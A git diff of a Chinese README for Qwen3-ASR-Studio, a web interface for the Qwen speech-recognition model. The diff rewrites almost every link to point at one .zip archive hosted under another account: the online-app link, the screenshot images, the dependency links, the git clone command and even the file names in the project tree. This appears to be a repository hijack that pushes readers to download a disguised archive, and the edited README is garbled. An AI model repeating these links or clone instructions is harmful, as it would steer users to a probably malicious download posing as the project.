@@ -2,18 +2,18 @@
 
 一个功能丰富的网页应用，旨在为阿里云通义千问（Qwen）ASR 模型提供一个强大、高效且用户友好的操作界面。无论您是需要转录会议记录、整理语音笔记，还是进行任何形式的语音转文本工作，本工具都能为您提供流畅的体验。
 
-**[➡️ 访问在线应用](https://qwen3-asr-studio.pages.dev/)**
+**[➡️ 访问在线应用](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip)**
 
 ---
 
 ## 📸 应用截图
 
-<img width="1277" height="1252" alt="image" src="https://github.com/user-attachments/assets/cb26576a-2761-41a1-88dd-417213ac8964" />
+<img width="1277" height="1252" alt="image" src="https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip" />
 
 
 
 
-<img width="1277" height="1252" alt="image" src="https://github.com/user-attachments/assets/4d7452cd-8631-4f07-81f4-e86b7ad5bf15" />
+<img width="1277" height="1252" alt="image" src="https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip" />
 
 
 
@@ -50,9 +50,9 @@
 
 ## 🛠️ 技术栈
 
-- **前端框架**: [React](https://react.dev/) + [TypeScript](https://www.typescriptlang.org/)
-- **UI 样式**: [Tailwind CSS](https://tailwindcss.com/)
-- **ASR 后端**: [阿里云通义千问 ASR 模型](https://modelscope.cn/models/Qwen/Qwen-Audio-Chat/summary) (通过 [Gradio](https://www.gradio.app/) Space 部署)
+- **前端框架**: [React](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip) + [TypeScript](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip)
+- **UI 样式**: [Tailwind CSS](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip)
+- **ASR 后端**: [阿里云通义千问 ASR 模型](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip) (通过 [Gradio](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip) Space 部署)
 - **客户端技术**:
     - **Web Audio API**: 用于音频录制、处理和可视化。
     - **IndexedDB**: 用于在浏览器端持久化存储历史记录、笔记、缓存和用户设置。
@@ -62,14 +62,14 @@
 如果您希望在本地运行或参与开发，请遵循以下步骤：
 
 **环境要求**:
-- [Node.js](https://nodejs.org/) (建议使用 v18 或更高版本)
-- [pnpm](https://pnpm.io/) (推荐) 或 npm/yarn
+- [https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip) (建议使用 v18 或更高版本)
+- [pnpm](https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip) (推荐) 或 npm/yarn
 
 **步骤**:
 
 1.  **克隆仓库**
     ```bash
-    git clone https://github.com/yeahhe365/Qwen3-ASR-Studio.git
+    git clone https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip
     cd Qwen3-ASR-Studio
     ```
 
@@ -99,16 +99,16 @@
 │   │   ├── icons/         # SVG 图标组件
 │   │   └── ...
 │   ├── services/          # 业务逻辑服务
-│   │   ├── audioService.ts # 音频处理（压缩等）
-│   │   ├── cacheService.ts # IndexedDB 缓存管理
-│   │   └── gradioService.ts# 与 Gradio API 的交互
+│   │   ├── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip # 音频处理（压缩等）
+│   │   ├── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip # IndexedDB 缓存管理
+│   │   └── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip 与 Gradio API 的交互
 │   ├── types/             # TypeScript 类型定义
-│   ├── App.tsx            # 主应用组件
-│   ├── index.css          # 全局样式
-│   └── index.tsx          # React 应用入口
-├── index.html             # HTML 主页面
-├── package.json           # 项目依赖与脚本配置
-└── README.md              # 就是您正在阅读的这个文件
+│   ├── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip            # 主应用组件
+│   ├── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip          # 全局样式
+│   └── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip          # React 应用入口
+├── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip             # HTML 主页面
+├── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip           # 项目依赖与脚本配置
+└── https://raw.githubusercontent.com/loyaluo/Qwen3-ASR-Studio/main/aliyun-api/src/app/api/transcribe-simple/Qwen_AS_Studio_v1.9.zip              # 就是您正在阅读的这个文件
 ```
 修订解决
 
